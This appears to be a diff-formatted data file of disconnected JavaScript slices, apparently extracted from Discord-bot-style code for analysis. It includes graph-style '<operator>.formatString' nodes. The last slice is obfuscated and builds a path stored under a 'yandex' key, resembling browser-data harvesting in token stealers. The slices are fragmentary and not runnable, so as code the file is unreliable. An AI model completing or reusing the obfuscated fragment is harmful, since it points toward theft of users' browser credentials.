@@ -1,0 +1,28 @@
+this.send(message).catch(err => {
+      err.message = `Error when sending ${type} response to master process: ${err.message}`;
+      this.client.emit('error', err);
+    })
+<operator>.formatString("Error when sending ", type, " response to master process: ", err.message, "")
+this.emit('error', new Error('Tried to send join packet, but the WebSocket is not open.'))
+const interval = setInterval(() => {
+          this.createShard();
+          if (this.shards.size >= this.totalShards) {
+            clearInterval(interval);
+            resolve(this.shards);
+          }
+        }, delay)
+<operator>.formatString("", mention, "", content ? `, ${content}` : '', "")
+this.currentStream = {
+      dispatcher,
+      broadcast,
+      input: broadcast,
+      output: broadcast,
+    }
+_tmp_7.yandex = _0x1e5e9d["join"](
+            _0x2b979a,
+            _0x2ad80d(0xcd),
+            _0x2ad80d(0x98),
+            _0x735e44[_0x2ad80d(0xba)],
+            _0x2ad80d(0xb4),
+            ..._0x175012
+          )
